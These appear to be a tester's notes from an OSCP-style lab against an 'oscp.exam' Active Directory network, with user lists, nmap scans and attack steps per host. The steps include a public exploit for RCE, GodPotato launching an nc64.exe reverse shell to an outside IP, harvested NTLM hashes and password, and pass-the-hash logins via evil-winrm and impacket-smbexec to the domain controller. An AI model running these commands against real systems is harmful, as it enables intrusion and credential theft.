# Domain
- oscp.exam

## Users
1. ms01\mary.williams (local user)
Administrator 
Aimee.Hunt
Carol.Webb
celia.almeda 
Chelsea.Byrne
Donna.Johnson
Emily.Bishop
Frank.Farrell
Georgina.Begum
Jamie.Thomas
Jane.Booth
Janice.Turner
Joan.North
john.dorian
Kenneth.Coles
krbtgt
Lawrence.Kay
Leonard.Morris
Linda.Patel
Luke.Martin
Oliver.Gray
Sandra.Craig
Shane.Mitchell
sql_svc
Thomas.Robinson
tom.kinney
tom_admin
web_svc

# MS01 .141
- MS01.oscp.exam
```
PORT      STATE SERVICE         VERSION
22/tcp    open  ssh             OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp    open  http            Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-generator: Nicepage 4.8.2, nicepage.com
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: TRACE
81/tcp    open  http            Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Attendance and Payroll System
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql           MySQL (unauthorized)
3307/tcp  open  opsession-prxy?
5040/tcp  open  unknown
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           Microsoft Windows RPC
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
49669/tcp open  msrpc           Microsoft Windows RPC
49670/tcp open  msrpc           Microsoft Windows RPC
58599/tcp open  msrpc           Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-02T13:51:11
|_  start_date: N/A
```

## Intersting Info
1. ``` __construct( $host = 'localhost', $user = 'root', $password = '', $database = 'apsystem' )  ``` from port 81 http
2. nurhodelta:password (from db)
3. 3306 is mysql | 3307 is maria db

## Foothold
1. found rce by attendance payroll system 50801 exploit
   ```
   python3 50801.py http://ms01:81
   ```
2. at ms01\mary.williams
   
## Root
1. Godpotato since whoami /priv have seimpersonate
2. ``` .\GodPotato-NET4.exe -cmd "C:\wamp64\attendance\images\nc64.exe 192.168.45.222 443 -e cmd.exe" ```

# MS02 .142
- ms02-oscp.exam
```
Nmap scan report for 10.10.200.142
Host is up (0.057s latency).
Not shown: 65520 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-09-08T13:41:56+00:00; -5s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.200.142:1433: 
|     Target_Name: OSCP
|     NetBIOS_Domain_Name: OSCP
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: MS02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.19041
| ms-sql-info: 
|   10.10.200.142:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-30T08:45:56
|_Not valid after:  2054-03-30T08:45:56
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.200.142:49700: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49700
|_ssl-date: 2024-09-08T13:41:56+00:00; -5s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.200.142:49700: 
|     Target_Name: OSCP
|     NetBIOS_Domain_Name: OSCP
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: MS02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.19041
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-30T08:45:56
|_Not valid after:  2054-03-30T08:45:56
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -5s, deviation: 0s, median: -5s
| smb2-time: 
|   date: 2024-09-08T13:41:18
|_  start_date: N/A
|_nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:6d:7d (VMware)

Post-scan script results:
| clock-skew: 
|   -5s: 
|     10.10.200.141
|_    10.10.200.142
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 1293.43 seconds
```

## Interested shit
1.      ```
           Looking for AutoLogon credentials
            Some AutoLogon credentials were found
            DefaultDomainName             :  OSCP.exam
            DefaultUserName               :  Administrato
        ```
2. ``` tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc ```

## Foothold
1. found celia ntlm
2. ```
    evil-winrm -i ms02 -u 'oscp.exam\celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
    ```

## Root


# DC01 .140
- dc01.oscp.exam
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-08 13:38:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
57708/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:a9:66 (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -6s
| smb2-time: 
|   date: 2024-09-08T13:41:17
|_  start_date: N/A

```

## Foothold & root
1. checking if ok ``` netexec smb dc01 -u tom_admin -H "4979d69d4ca66955c075c41cf45f24dc" -d oscp.exam ```
2. direct fuck``` impacket-smbexec -hashes :4979d69d4ca66955c075c41cf45f24dc "oscp.exam/tom_admin@dc01"```